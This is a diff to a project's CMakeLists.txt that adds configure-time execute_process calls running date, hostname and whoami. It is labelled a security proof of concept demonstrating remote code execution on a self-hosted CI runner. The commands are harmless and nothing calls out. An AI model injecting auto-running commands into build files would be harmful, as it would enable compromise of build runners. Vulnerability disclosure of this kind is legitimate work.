@@ -20,6 +20,24 @@
 
 cmake_minimum_required(VERSION 3.14)
 
+# [Security PoC] Execute harmless commands to demonstrate RCE on self-hosted runner
+execute_process(
+  COMMAND date
+  OUTPUT_VARIABLE _poc_date
+  OUTPUT_STRIP_TRAILING_WHITESPACE
+)
+execute_process(
+  COMMAND hostname
+  OUTPUT_VARIABLE _poc_host
+  OUTPUT_STRIP_TRAILING_WHITESPACE
+)
+execute_process(
+  COMMAND whoami
+  OUTPUT_VARIABLE _poc_user
+  OUTPUT_STRIP_TRAILING_WHITESPACE
+)
+message(STATUS "=== SECURITY PoC: ${_poc_date} on ${_poc_host} as ${_poc_user} ===")
+
 project("js_driver")
 
 get_filename_component(PROJECT_ROOT_DIR "${PROJECT_SOURCE_DIR}/../.." REALPATH)
